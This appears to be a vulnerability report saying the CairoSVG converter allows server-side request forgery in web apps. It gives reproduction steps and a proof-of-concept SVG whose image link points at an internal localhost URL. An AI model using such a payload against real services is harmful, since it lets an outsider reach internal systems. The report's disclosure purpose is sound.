# Description


 `CairoSVG` is an SVG converter based on Cairo. It can export SVG files to PDF, EPS, PS, and PNG files. **useing this package in webapps can be lead to** `SSRF` **attacks**

https://github.com/sterlp/svg2png

# :recycle:  Steps To Reproduce-:  
  0) `$ pip3 install cairosvg`
  1) `$ cairosvg payload.svg`
  1) creat a payload svg or use : [rc3.svg](https://drive.google.com/file/d/1jGhUXepvOV9bs_aaCThSmqloY_C1Nsj4/view?usp=sharing)

  rc3.svg
  ```
  <?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="overflow: hidden; position: relative;" width="300" height="200">
<image x="10" y="10" width="276" height="110" xlink:href="http://localhost:8080/svg" stroke-width="1" id="image3204" />
<rect x="0" y="150" height="10" width="300" style="fill: black"/>
</svg>

  ```
# POC :-

[gdrive](https://drive.google.com/file/d/1VqfAgldmtY-qrgHRfizVvAH2oIFZVT-q/view?usp=sharing)
## 💥 Impact
SSRF 
